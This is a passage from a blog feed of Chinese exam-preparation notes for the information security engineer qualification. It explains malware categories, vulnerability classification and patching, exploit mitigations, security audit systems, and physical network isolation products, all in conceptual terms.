id="对比">对比</h2><ul><li><p>共性危害：均破坏信息安全三要素（保密性、完整性、可用性）</p></li><li><p>特性对比：</p><ul><li>病毒：<ul><li>必须依附宿主文件传播（如绑定EXE文件）</li><li>具备自我复制能力</li><li>典型破坏：文件损坏、系统异常</li></ul></li><li>木马：<ul><li>伪装成合法程序诱导执行</li><li>核心功能：信息窃取/远程控制</li><li>无自我复制能力</li><li>典型案例：键盘记录、RAT远程控制</li></ul></li><li>蠕虫：<ul><li>独立传播（不依赖宿主文件）</li><li>主要通过移动介质/内网传播</li><li>典型破坏：资源耗尽（如&quot;震网&quot;病毒）</li></ul></li></ul></li><li><p>分类关系：现代恶意代码界限模糊，如勒索软件兼具蠕虫传播与病毒破坏特性</p></li><li><p>僵尸网络与木马的区别</p><ul><li>控制维度：<ul><li>木马：针对单机控制（本地/网络木马）</li><li>僵尸网络：规模化控制网络（需大量感染主机）</li></ul></li><li>功能扩展：<ul><li>基础木马：仅实现远程控制</li><li>僵尸程序：额外集成攻击模块（如DDoS工具包）</li></ul></li><li>演化关系：僵尸网络本质是网络木马的集群化升级，通过C&amp;C服务器实现集中化管理</li></ul></li></ul><h2 id="其他恶意代码">其他恶意代码</h2><h3 id="逻辑炸弹">逻辑炸弹</h3><ul><li>依附性：依附在其他软件中的程序代码，具有触发执行破坏能力</li><li>触发机制：必须满足特定条件才会执行破坏功能，包括：<ul><li>计数器触发（如全网30%感染后爆发）</li><li>时间触发（如首台感染60天后爆发）</li><li>文件触发/特定用户访问触发等</li></ul></li><li>组合攻击：常与其他恶意代码结合使用，增强破坏效果</li></ul><h3 id="陷门-后门">陷门（后门）</h3><ul><li>隐蔽入口：允许绕过系统安全机制访问系统的代码段</li><li>开发用途：最初用于调试程序、系统维护（如预留SSH非标准端口68011）</li><li>攻击利用：攻击者用于维持访问权限（避免重复30天攻击过程）</li><li>传播特性：不具备自动传播和自我复制功能</li></ul><h3 id="细菌">细菌</h3><ul><li>复制机制：通过创建两个文件为基础进行指数级自我复制</li><li>攻击目标：不直接攻击软件，但通过消耗CPU/内存/磁盘空间实施DoS攻击</li><li>典型表现：类似&quot;蠕虫&quot;但无传播性，仅在本机快速复制</li></ul><h3 id="间谍软件">间谍软件</h3><ul><li>隐蔽安装：用户不知情情况下安装（常通过软件捆绑&quot;全家桶&quot;）</li><li>恶意行为：<ul><li>弹出广告/浏览器劫持</li><li>记录击键、浏览习惯</li><li>窃取账号密码、信用卡号等敏感信息</li></ul></li><li>传播限制：通常不具备自我复制功能</li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（13）：网络安全漏洞</title>
      <link href="/2025/08/14/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8813%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/08/14/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8813%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全漏洞分类与管理">网络安全漏洞分类与管理</h2><h3 id="分类">分类</h3><h4 id="cve漏洞分类">CVE漏洞分类</h4><ul><li><p>维护机构：美国MITRE公司</p></li><li><p>核心功能：</p><ul><li>统一漏洞标识（如CVE-2019-1543）</li><li>规范化漏洞描述</li><li>促进漏洞数据共享</li></ul></li><li><p>编号规则：CVE-年份-序列号</p></li></ul><h4 id="cvss">CVSS</h4><ul><li><p>评分维度：</p><ul><li>基本度量：攻击向量、攻击复杂性、特权要求、用户交互、完整性影响、可用性影响、影响范围</li><li>时序度量：漏洞利用成熟度、修补等级、漏洞报告</li><li>环境度量：完整性要求、保密性要求、可用性要求、修订基本得分</li></ul></li><li><p>应用场景：量化漏洞危险等级（0-10分）</p></li></ul><h4 id="我国信息安全漏洞分类">我国信息安全漏洞分类</h4><ul><li><p>两大体系：</p><ul><li>CNNVD（国家信息安全漏洞库）<ul><li>24类技术漏洞</li></ul></li><li>CNVD（国家漏洞共享平台）（<strong>重点</strong>）<ul><li>按成因：11类</li><li>按行业：分为行业漏洞和应用漏洞；<ul><li>行业漏洞：电信、移动互联网、工控系统</li><li>应用漏洞：web应用、安全产品、应用程序、操作系统、数据库、网络设备等</li></ul></li><li>漏洞分级：分为高、中、低三种</li></ul></li></ul></li></ul><h4 id="owasp-top10漏洞分类">OWASP TOP10漏洞分类</h4><ul><li>针对领域：Web应用程序</li><li>最新版本：<ul><li>注入攻击（首位）</li><li>失效访问控制</li><li>XSS跨站脚本</li><li>不安全的反序列化</li></ul></li></ul><h3 id="安全漏洞发布">安全漏洞发布</h3><ul><li>发布主体：<ul><li>厂商（微软安全公告）</li><li>安全组织（CNVD）</li><li>白帽黑客</li></ul></li><li>发布内容：<ul><li>漏洞编号</li><li>危害等级</li><li>影响范围</li><li>修复建议</li></ul></li><li>典型渠道：<ul><li>安全公告网站</li><li>邮件订阅</li><li>技术论坛</li></ul></li></ul><h3 id="漏洞发布相关组织">漏洞发布相关组织</h3><ul><li>国际组织：<ul><li>CERT（首个应急响应组织）</li><li>Security Focus（商业化漏洞库）</li></ul></li><li>国内机构：<ul><li>CNNVD（测评中心运维）</li><li>CNVD（多机构联合平台）</li></ul></li></ul><h3 id="网络安全漏洞管理过程">网络安全漏洞管理过程</h3><ul><li>五步闭环：<ul><li>资产确认：建立全量资产档案</li><li>漏洞采集：自动化扫描+人工审计</li><li>风险评估：<ul><li>业务影响分析</li><li>利用可能性评估</li></ul></li><li>处置控制：<ul><li>补丁管理</li><li>系统升级</li><li>流程优化</li></ul></li><li>持续跟踪：验证修复效果</li></ul></li></ul><h2 id="网络安全漏洞扫描技术与应用">网络安全漏洞扫描技术与应用</h2><h3 id="漏洞扫描器">漏洞扫描器</h3><ul><li>核心组件：包含用户界面、扫描引擎、结果分析模块和漏洞信息库四大功能模块</li><li>双刃剑特性：既可用于防御（提前发现并修补漏洞）也可被黑客用于攻击前期的信息收集</li></ul><h4 id="漏洞扫描器的模块和功能">漏洞扫描器的模块和功能</h4><ul><li>用户界面：接受用户指令、定制扫描策略、控制扫描启停，分为图形化界面和命令行界面</li><li>扫描引擎：核心执行组件，负责解析扫描策略、执行扫描任务并保存原始扫描数据</li><li>结果分析：商业产品提供漏洞解读和修复建议（如漏洞危害说明、修复步骤12345）</li><li>信息库：存储漏洞特征数据、扫描策略配置参数，支持漏洞信息查询与管理</li></ul><h4 id="漏洞扫描器的分类">漏洞扫描器的分类</h4><ul><li>主机漏洞扫描器<ul><li>检测方式：本地检查关键文件内容和安全属性（无需网络连接）</li><li>典型发现：配置错误（如注册表异常）、弱口令（如&quot;123456&quot;）、有漏洞的软件版本</li><li>局限：仅支持单机检测，与目标系统运行在同一主机</li></ul></li><li>网络漏洞扫描器<ul><li>检测方式：通过网络连接发送特定请求检测服务漏洞</li><li>典型发现：Web/FTP/Telnet等服务漏洞</li><li>优势：支持远程检测联网系统</li><li>局限：无本地权限导致信息获取有限</li></ul></li><li>专用漏洞扫描器<ul><li>针对性检测：专用于特定系统如数据库（Oracle/MySQL）、网络设备（路由器/交换机）、Web应用、工控系统</li></ul></li></ul><h3 id="网络安全漏洞发现技术">网络安全漏洞发现技术</h3><ul><li>主要方法：人工分析（深度但耗时）、工具自动化（效率高但覆盖有限）、人机结合（主流方案）</li><li>技术原理：基于历史漏洞构建特征库，通过模式识别检测新漏洞</li><li>具体技术：包括文本搜索、词法分析、模糊测试（如异常输入检测）、动态污点分析（数据流追踪）等7类技术</li></ul><h3 id="漏洞修补技术">漏洞修补技术</h3><img src="https://image.icewindy.cn/2025/08/ea3b7b49850b5d3b3bd7025f28690f74.png" alt="image-20250814163629514" style="zoom:50%;" /><ul><li>循环流程：包含现状分析→补丁跟踪→验证→安装→应急处理→检查的闭环</li><li>持续特性：类似Windows系统需持续更新补丁（如每月安全更新）</li><li>关键环节：补丁验证（测试兼容性）和应急处理（补丁失败的回滚方案）最易被忽视</li></ul><h2 id="网络安全漏洞利用防范技术">网络安全漏洞利用防范技术</h2><ul><li>地址空间随机化(ASLR): 通过随机化程序加载到内存的地址，使攻击者无法预知shellcode地址，从而降低缓冲区溢出攻击成功率。核心原理是内存地址随机分配使攻击输入难以精准覆盖目标内存区域。</li><li>数据执行保护(DEP): 将特定内存区域标记为&quot;非执行&quot;状态，阻止代码在数据区域（如堆栈）运行。典型案例是保护应用程序堆栈区域免受攻击者利用。</li><li>SEHOP防护: 通过阻止攻击者利用结构化异常处理程序(SEH)重写来实现防护，属于高级系统防护机制。</li><li>虚拟补丁技术: 在不修改可执行程序前提下，通过安全设备（如WAF）检测并过滤漏洞攻击流量。典型应用场景是对不能停机打补丁的24小时在线系统（如数据库审计系统）进行临时防护。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（12）：网络安全审计</title>
      <link href="/2025/08/13/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8812%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/08/13/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8812%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全审计概述与组成">网络安全审计概述与组成</h2><h3 id="概念">概念</h3><ul><li>核心定位：属于4A安全框架（认证、授权、账号、审计）中的最后一环，是项目实践中应用广泛的重要技术</li><li>基本定义：对网络信息系统的安全相关活动信息进行<strong>获取、记录、存储、分析和利用</strong>的工作</li><li>作用机制：建立**&quot;事后&quot;<strong>安全保障措施，为安全事件分析</strong>提供线索及证据**</li><li>技术价值：发现潜在网络安全威胁，开展风险分析及管理</li></ul><h3 id="我国审计安全机制标准">我国审计安全机制标准</h3><ul><li>标准依据：GB17859《计算机信息系统安全保护等级划分准则》</li><li>级别要求：<strong>从第二级（系统审计保护级）开始强制要求审计机制</strong></li><li>实施要点：可信计算机实施细粒度自主访问控制</li><li>等保审计要求：<ul><li>二级（系统审计保护级）：基础审计功能，记录身份鉴别、客体操作等事件</li><li>三级（安全标记保护级）：审计记录包含<strong>客体名与客体的安全级别</strong>。此外计算机信息系统可信计算基具有审计<strong>更改可读输出记号</strong>的能力</li><li>四级（结构化保护级）：计算机信息系统可信计算基能够审计<strong>利用隐蔽存储信道时</strong>可能被使用的事件</li><li>五级（访问验证保护级）：计算机信息系统可信计算基包含能够监控可审计安全事件<strong>发生与累计机制</strong>，<strong>超过阈值时，能够立即向安全管理员发出警报</strong>，并且继续发生或累计，系统应最小代价终止它们。</li></ul></li></ul><h3 id="审计系统组成">审计系统组成</h3><img src="https://image.icewindy.cn/2025/08/aed0639fb1d4f6213957140a0ef855f1.png" alt="image-20250813151016967" style="zoom:67%;" /><ul><li>核心组件：<ul><li><strong>审计信息获取</strong>：从操作系统、数据库等审计对象采集数据</li><li><strong>审计信息存储</strong>：持久化保存审计记录</li><li><strong>审计信息分析</strong>：对安全事件进行关联分析</li><li><strong>信息展示利用</strong>：可视化呈现分析结果</li><li><strong>系统管理</strong>：配置审计策略和权限</li></ul></li><li>工作流程：获取→存储→分析→展示的闭环处理</li></ul><h3 id="审计系统类型">审计系统类型</h3><ul><li><p>操作系统安全审计</p><ul><li><p>审计内容：用户登录/注销、服务启停、安全事件等</p></li><li><p>Windows审计：</p><ul><li>注册登录事件</li><li>目录服务访问</li><li>账户管理操作</li><li>对象访问记录</li></ul></li><li><p>Linux审计：</p><ul><li>开机日志：﻿boot.log</li><li>用户操作：﻿acct/pacct</li><li>登录记录：lastlog/utmp/wtmp</li><li>特权命令：sulog</li><li>记忆点：Linux日志文件路径是常见考题（如﻿boot.log记录开机信息）</li></ul></li></ul></li><li><p>数据库审计</p><ul><li>监控对象：用户对数据库的读、写、查询、添加、修改、删除操作</li></ul></li><li><p>特色功能：支持操作命令回放，可追溯完整操作链</p><ul><li>典型场景：监控敏感数据访问行为，防范SQL注入等攻击</li></ul></li><li><p>网络通信安全审计</p><ul><li>实现方式：专用审计系统（如上网行为管理设备）</li><li>审计要素：<ul><li>IP地址（源/目的）</li><li>端口号（源/目的）</li><li>协议类型</li><li>传输内容（邮件/聊天记录等）</li></ul></li></ul></li><li><p>按审计范围分类：</p><ul><li><p>综合审计系统：集中管理多设备日志（如华为eLog）</p></li><li><p>单个审计系统：设备自带基础功能（如防火墙日志）</p></li><li><p>能力对比：</p><ul><li>综合系统：支持多源关联分析，功能完善</li><li>单机系统：数据来源单一，分析能力有限</li></ul></li><li><p>发展趋势：态势感知系统属于综合审计的高级形态</p></li></ul></li></ul><h2 id="网络安全审计机制与实现技术">网络安全审计机制与实现技术</h2><h3 id="网络流量数据获取技术">网络流量数据获取技术</h3><ul><li><p>技术分类：</p><ul><li><strong>基于主机</strong>的审计机制：关注终端设备如电脑的审计</li><li><strong>基于网络通信</strong>的审计机制：关注网络流量数据的审计</li><li><strong>基于应用</strong>的审计机制：针对特定应用如网页、数据库的审计</li></ul></li><li><p>系统日志数据采集技术：</p><ul><li>将操作系统、数据库、网络设备等产生的日志集中存储到统一服务器</li><li>便于查询分析与管理，是重要的审计信息来源</li></ul></li><li><p>网络流量数据获取技术：</p><ul><li><strong>共享网络监听</strong>：通过集线器(Hub)实现，所有接口流量会广播到其他所有接口</li><li><strong>交换机端口镜像</strong>(Port Mirroring)：在交换机配置镜像端口，将指定端口流量复制到采集设备</li><li><strong>网络分流器</strong>(Network Tap)：运营商专用硬件设备，用于大流量环境下的流量采集</li></ul></li><li><p>网络数据捕获软件（抓包软件）：</p><ul><li><p>Libpcap工作流程：</p><ul><li>设置嗅探网络接口(如Linux的eth0)</li><li>初始化并设置过滤规则</li><li>运行循环主体接收符合规则的数据包</li></ul></li><li><p>常见工具：</p><ul><li>Winpcap：Windows平台数据捕获</li><li>Windump：基于Winpcap的网络协议分析工具</li><li>Tcpdump：Linux系统中常用的流量采集工具</li><li>Wireshark：图形化网络流量采集分析工具(最常用)</li></ul></li></ul></li></ul><h3 id="网络审计数据安全分析技术">网络审计数据安全分析技术</h3><h4 id="字符串匹配">字符串匹配</h4><ul><li>实现方式：通过模式匹配查找相关审计数据</li><li>常用工具：grep命令，格式为<code>grep [options][regexp][filename]</code></li><li>实例：<code>display current-configuration| begin vrrp</code>可只显示以vrrp开头的配置</li></ul><h4 id="全文搜索">全文搜索</h4><ul><li>应用场景：处理海量日志数据时使用搜索引擎技术</li><li>典型工具：<strong>Elasticsearch</strong>开源搜索引擎</li></ul><h4 id="数据关联">数据关联</h4><ul><li>实现方式：将系统日志、网络流量、安全设备日志等多源数据进行综合分析</li><li>作用：发现异常流量，识别未知攻击手段</li></ul><h4 id="统计报表">统计报表</h4><ul><li>功能：对特定事件、阈值、安全基线进行统计分析</li><li>输出形式：生成告警信息及日报、周报、月报</li></ul><h4 id="可视化分析">可视化分析</h4><ul><li>表现形式：饼图、柱状图、折线图、地图等</li><li>典型应用：<ul><li>用户流量排行</li><li>网站浏览排行</li><li>上网时长排行</li><li>文件外发分析</li></ul></li><li>优势：直观展示审计信息，便于快速理解</li></ul><h3 id="审计数据存储技术">审计数据存储技术</h3><ul><li>分散存储：各系统自行保存审计数据</li><li>集中存储：建立专用审计数据存储服务器，便于查询分析和电子取证</li></ul><h3 id="审计日志存储方式">审计日志存储方式</h3><ul><li>在线日志：<ul><li>格式：文件数据库</li><li>特点：占用空间大但查询速度快</li></ul></li><li>转储日志：<ul><li>格式：压缩后的文件数据库</li><li>特点：节省空间60%，查询前需自动解压</li></ul></li><li>备份日志：<ul><li>存储介质：磁带库等离线存储</li><li>特点：不占用系统空间但无法直接查询</li></ul></li></ul><h3 id="审计数据保护技术">审计数据保护技术</h3><ul><li>系统用户分权管理（管理层面）：<ul><li>操作员：负责系统操作维护，操作被记录</li><li>安全员：负责安全策略配置维护</li><li>审计员：维护审计事宜，查看操作日志</li><li>注意：三元职责分离，审计员不能操作系统，操作员不能修改记录</li></ul></li><li>其他保护技术：<ul><li>强制访问控制：设置安全标记防止非授权访问</li><li>数据加密：保护敏感审计数据机密性</li><li>隐私保护：防止隐私信息泄露</li><li>完整性保护：使用Hash算法和数字签名防止篡改</li></ul></li></ul><h2 id="网络安全审计产品与应用">网络安全审计产品与应用</h2><h3 id="网络安全审计产品">网络安全审计产品</h3><h4 id="日志安全审计产品">日志安全审计产品</h4><ul><li>核心技术：采用Syslog、Snmptrap、NetFlow等十余种协议和技术实现异构日志采集</li><li>处理流程：实现分布式采集→集中存储→统计分析→可视化呈现全流程管理</li></ul><h4 id="主机监控与审计产品">主机监控与审计产品</h4><ul><li>本质特征：与主机入侵检测系统(HIDS)/终端检测响应(EDR)属于同类产品</li><li>监控维度：涵盖用户行为、系统配置、补丁状态、外设使用等六大核心维度</li><li>典型功能：包括U盘使用监控、非法外联阻断、系统配置合规检查等</li></ul><h4 id="数据库审计产品">数据库审计产品</h4><ul><li>监测技术：采用<strong>网络流量分析、系统调用监控、数据库代理</strong>三种核心技术</li><li>阻断能力：支持镜像模式(仅监测)和串联模式(可阻断)两种部署方式</li><li>典型应用：发现绕过业务系统直接操作数据库的违规行为</li><li>审计内容：记录SQL语句、操作时间、执行账号等完整操作轨迹</li></ul><h4 id="网络安全审计产品-上网行为管理">网络安全审计产品（上网行为管理）</h4><ul><li>基本原理：网络流量<strong>信息采集及数据包深度内容分析（DPI深度包检测技术）</strong></li><li>协议支持：覆盖SMTP/POP3(邮件)、HTTP(网页)、NetBios(文件共享)等主流协议</li><li>审计深度：可完整记录邮件内容、网页浏览记录、文件操作过程等</li><li>性能指标：关键指标包括<strong>支持带宽、协议识别种类、查询响应时间</strong></li></ul><h4 id="工控网络审计">工控网络审计</h4><ul><li>技术特点：专为Modbus等工业协议设计的行为审计系统</li><li>部署模式：<ul><li>一体化设备：采集分析功能集成</li><li>分布式架构：采集端与分析端分离</li></ul></li><li>响应能力：可自动阻断违规工控指令</li><li>典型场景：适用于智能制造、能源等工业环境</li></ul><h4 id="运维安全审计产品">运维安全审计产品</h4><ul><li><p>运维安全审计功能</p><ul><li>审计维度：<ul><li>字符会话(SSH/Telnet命令)</li><li>图形操作(RDP/VNC录屏)</li><li>数据库运维(SQL操作)</li><li>文件传输(FTP/SFTP)</li></ul></li><li>记录要素：**“什么终端、什么时间、登录什么设备（或系统）、做了什么操作、返回什么结果、什么时间登出”**等行为信息</li><li>基本原理：<strong>网络流量信息采集或服务代理</strong></li><li>合规检查：基于安全策略自动进行合规性判定</li></ul></li><li><p>堡垒机/运维审计 - 实现运维单点登录</p><img src="https://image.icewindy.cn/2025/08/f145b274a57745d677e5e75f4ebca5e9.png" alt="image-20250813162113103" style="zoom:50%;" /><ul><li>核心价值：解决&quot;内鬼&quot;问题，防范内部人员滥用权限</li><li>认证集成：支持证书/AD/指纹等多种认证方式统一入口</li><li>访问控制：所有运维访问必须通过堡垒机跳转</li><li>操作审计<ul><li>审计粒度：精确到每条命令的执行时间和内容</li><li>回放能力：支持操作过程的视频级重现</li><li>典型记录：包含登录时间、协议类型、操作账号等关键字段</li><li>命令审计：记录passwd、cd、ls等所有执行命令</li><li>安全威慑：形成&quot;操作留痕-责任追溯&quot;的完整证据链</li></ul></li></ul></li></ul><h3 id="网络安全审计应用">网络安全审计应用</h3><h4 id="安全运维保障">安全运维保障</h4><ul><li>典型案例：发现绕过堡垒机直接访问服务器的&quot;跳板&quot;行为</li><li>防御机制：结合系统日志与审计日志进行关联分析</li><li>管理价值：满足等保2.0对运维审计的合规要求</li></ul><h4 id="数据访问监测">数据访问监测</h4><ul><li>三层架构：重点监测绕过Web层直接访问数据库的异常行为</li><li>业务逻辑：通过分析操作时序发现违背业务流的违规访问</li><li>审计策略：建立&quot;前台登录-后台操作&quot;的关联规则</li></ul><h4 id="网络入侵检测">网络入侵检测</h4><ul><li>识别特征：连续认证失败日志提示暴力破解攻击</li><li>响应机制：产生实时告警通知管理员处置</li><li>考试要点：需理解日志特征与攻击类型的对应关系</li></ul><h4 id="网络电子取证">网络电子取证</h4><ul><li>证据链：通过路由器日志→IP定位→主机日志形成完整证据</li><li>法律效力：电子日志需符合《电子签名法》取证规范</li><li>侦查流程：体现从网络攻击到人员定位的完整溯源</li></ul><h4 id="从海量日志中快速发现网络中安全薄弱点">从海量日志中快速发现网络中安全薄弱点</h4><ul><li>可视化转换：将原始日志转换为趋势图、排行榜等直观形式</li><li>分析维度：<ul><li>攻击类型分布</li><li>高频攻击源</li><li>脆弱设备排名</li></ul></li><li>产品演进：日志审计→态势感知的分析能力升级路径</li></ul><h4 id="安全事件查询">安全事件查询</h4><ul><li>筛选维度：支持按时间、IP、危险等级等多条件组合查询</li><li>告警分级：Emergency→Critical→Warning的等级体系</li><li>调查效率：大幅提升安全事件定位速度</li></ul><h4 id="全面的安全业务分析">全面的安全业务分析</h4><ul><li>报表类型：<ul><li>攻击事件趋势图</li><li>协议分布饼图</li><li>时间维度热力图</li></ul></li><li>导出功能：支持PDF/Excel等多种格式报表导出</li><li>决策支持：为安全策略优化提供数据依据</li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（11）：网络物理隔离</title>
      <link href="/2025/08/12/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8811%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%89%A9%E7%90%86%E9%9A%94%E7%A6%BB/"/>
      <url>/2025/08/12/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8811%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%89%A9%E7%90%86%E9%9A%94%E7%A6%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="网络物理隔离技术">网络物理隔离技术</h2><h3 id="概述">概述</h3><ul><li>定义：网络物理隔离是<strong>既满足内外网数据交换需求，又能防止网络安全事件出现</strong>的安全技术。其基本原理是<strong>避免</strong>计算机之间<strong>直接连通</strong>，以<strong>阻断在线网络攻击</strong>。</li><li>典型设备：网闸是典型的物理隔离设备</li><li>安全风险：<ul><li>非法外联：隔离网络用户私自连接互联网（如涉密网连接云桌面后远程控制）</li><li>U盘摆渡：通过U盘作为介质传播病毒或窃取数据</li><li>产品漏洞：隔离设备存在﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">DoS</mi><mo>⁡</mo><mi mathvariant="normal">/</mi><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">D</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">S</mi></mrow></mrow><annotation encoding="application/x-tex">\operatorname{DoS}/\mathrm{DDoS}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">D</span><span class="mord mathrm">o</span><span class="mord mathrm">S</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">/</span><span class="mord"><span class="mord mathrm">D</span><span class="mord mathrm">D</span><span class="mord mathrm">o</span><span class="mord mathrm">S</span></span></span></span></span>﻿攻击风险或被构造恶意数据绕过</li><li>新型攻击：通过声波/热量/电磁波等模拟信号窃密（如Bitwhisper温度窃密技术）</li></ul></li></ul><h3 id="网络物理隔离机制与实现技术">网络物理隔离机制与实现技术</h3><ul><li><p>专用计算机：指定专用区域计算机仅连接外网，需离开工作环境使用</p></li><li><p>多PC方案：桌面部署两台PC分别连接内外网（政府单位常用方案）</p><img src="https://image.icewindy.cn/2025/08/9c0341aa64bdf8c2639d1452e5444ea8.png" alt="image-20250812144305425" style="zoom:50%;" /></li><li><p>外网代理：在内网指定服务器，负责专门搜集外网的置顶信息，然后把外网信息手工导入内网（U盘、光盘等），从而实现内部用户“上网”，又切断了内外网物理连接。</p></li><li><p>内外网网线切换器：通过物理开关盒切换网络连接</p><img src="https://image.icewindy.cn/2025/08/411edde77cee76b1115e4ffc97be6879.png" alt="image-20250812144815849" style="zoom:50%;" /></li><li><p>单硬盘分区：通过隔离卡划分逻辑分区控制访问权限</p></li><li><p>双硬盘方案：在一台机器安装两个操作系统硬盘，通过硬盘控制卡进行切换，需重启切换（存在管理不便问题）</p></li></ul><h3 id="其他物理隔离机制与实现技术">其他物理隔离机制与实现技术</h3><ul><li>协议隔离：通过协议转换实现逻辑隔离（如TCP/IP转私有协议再转回）<ul><li>协议转换定义：协议的剥离与重建</li></ul></li><li>单向传输：单工通信部件构成无反馈通道，只可以单向导入/导出</li><li>信息摆渡：中间缓存区仅单边连接。在任何时候，<strong>中间缓存区域只与一段安全域相连</strong></li><li>物理断开：电子开关确保传导/存储的物理断开（如网闸开关控制）</li></ul><h2 id="网络物理隔离产品">网络物理隔离产品</h2><h3 id="终端隔离产品">终端隔离产品</h3><ul><li><p>功能定义：用于同时连接两个不同的安全域，采用物理断开技术在终端上实现安全域物理隔离</p><img src="https://image.icewindy.cn/2025/08/6fb6f020ec58a323367bff2f3f59d8dd.png" alt="image-20250812155005468" style="zoom:67%;" /></li><li><p>产品形态：</p><ul><li>安全隔离卡：通过电子开关以<strong>互斥形式</strong>同时连通安全域A所连硬盘或安全域B所连硬盘</li><li>安全隔离计算机：将隔离卡整合入主机的整机产品</li></ul></li><li><p>工作原理：</p><ul><li>采用双硬盘设计（硬盘1对应安全域A，硬盘2对应安全域B）</li><li>启动时只能读取一个硬盘的数据，实现物理隔离</li><li>典型应用场景：政府单位等对安全性要求高的环境</li></ul></li><li><p>技术特点：</p><ul><li>相比单硬盘逻辑分区方案，双物理硬盘安全性更高</li><li>通过硬件开关实现真正的物理隔离</li></ul></li></ul><h3 id="网络隔离产品">网络隔离产品</h3><img src="https://image.icewindy.cn/2025/08/26777597f89602f0040d7c746090a921.png" alt="image-20250812155114003" style="zoom:67%;" /><ul><li><p>核心功能：</p><ul><li>连接两个不同安全域</li><li>提供应用代理服务、协议转换、信息流访问控制</li><li>实现内容过滤和信息摆渡</li></ul></li><li><p>技术架构：</p><ul><li>采用&quot;2+1&quot;架构：两台主机（内网外网主机）+专用隔离部件</li><li>专用隔离部件形式：<ul><li>含电子开关的专用隔离芯片板卡</li><li>安全强化的专用控制程序主机</li></ul></li></ul></li><li><p>关键技术：</p><ul><li>协议隔离技术：剥离和重建网络协议（数据交换区使用私有协议）</li><li>信息摆渡技术：通过中间缓冲区传输数据</li></ul></li><li><p>典型代表：<strong>网闸</strong></p><img src="https://image.icewindy.cn/2025/08/b91387f65688fc17c73da4abb57a30dc.png" alt="image-20250812155232414" style="zoom:50%;" /><ul><li><strong>GAP技术</strong>原理：<ul><li>使不连通的网络实现安全数据交换</li><li>典型架构包含内网处理单元、外网处理单元和数据交换区</li></ul></li><li>工作流程：（2+1）<ul><li>数据先到达内网处理单元</li><li>通过专用协议摆渡到数据交换区</li><li>再从交换区传输到外网处理单元</li></ul></li><li>技术特点：<ul><li>中间传输不跑TCP/IP协议（协议隔离技术）</li><li>采用单向连通技术（类似闸刀原理）</li><li>同时应用了协议隔离和信息摆渡技术</li></ul></li><li>安全风险：<ul><li>恶意代码可能隐藏在电子文档中</li><li>通过文档触发构成内部网络威胁</li></ul></li></ul></li></ul><h3 id="网络单向导入产品">网络单向导入产品</h3><ul><li>核心特性：<ul><li>构造信息单向传输的唯一通道</li><li>反方向无任何信息传输或反馈</li></ul></li><li>产品组成：<ul><li>双机方式：数据发送处理单元+数据接收处理单元</li><li>中间采用单向传输部件连接</li></ul></li><li>工作原理：<ul><li>信息只能从安全域A单向流入安全域B</li><li>利用物理特性建立单向传输通道</li><li>无任何反馈信号</li></ul></li><li>典型实现：<ul><li>光单向导入产品（光单导）</li><li>基于电信号或光信号传输</li></ul></li></ul><h2 id="网络物理隔离应用">网络物理隔离应用</h2><h3 id="内网工作站安全隔离">内网工作站安全隔离</h3><img src="https://image.icewindy.cn/2025/08/58271ff4b1bf624d35fefd681592a5db.png" alt="image-20250812155805856" style="zoom:50%;" /><ul><li>隔离卡功能：通过物理隔离卡实现一台工作机在上互联网时，从物理上断开与内部网的连接，减少内网安全威胁</li><li>硬件配置：可配置两块硬盘（一块访问内网服务器/打印机，一块访问互联网）或单硬盘多分区方案</li><li>切换机制：通过隔离卡硬件切换不同硬盘或分区，确保内外网访问的物理隔离性</li></ul><h3 id="电子政务网闸应用">电子政务网闸应用</h3><img src="https://image.icewindy.cn/2025/08/29dc88cdb760aad257f9c6d4815950ed.png" alt="image-20250812155933626" style="zoom:67%;" 